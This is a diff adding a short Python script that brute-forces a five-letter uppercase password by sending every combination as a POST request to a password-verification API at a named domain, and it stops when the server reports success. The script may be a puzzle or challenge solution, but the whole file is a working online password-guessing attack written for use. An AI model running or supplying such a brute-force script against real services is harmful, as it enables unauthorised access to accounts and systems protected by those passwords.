@@ -1,0 +1,28 @@
+import requests
+import string
+from itertools import product
+
+# API URL
+url = "https://secret.corgi.insure/api/verify-password"
+
+# Characters to try: uppercase A-Z
+characters = string.ascii_uppercase
+
+def brute_force_password():
+    # Generate all combinations of 5 characters
+    for combo in product(characters, repeat=5):
+        password = ''.join(combo)
+        payload = {"password": password}
+        
+        # Make a POST request
+        response = requests.post(url, json=payload)
+        
+        if response.status_code == 200 and response.json().get("success", False):
+            print(f"Password found: {password}")
+            return
+
+    print("Password not found.")
+
+# Run the script
+brute_force_password()
+
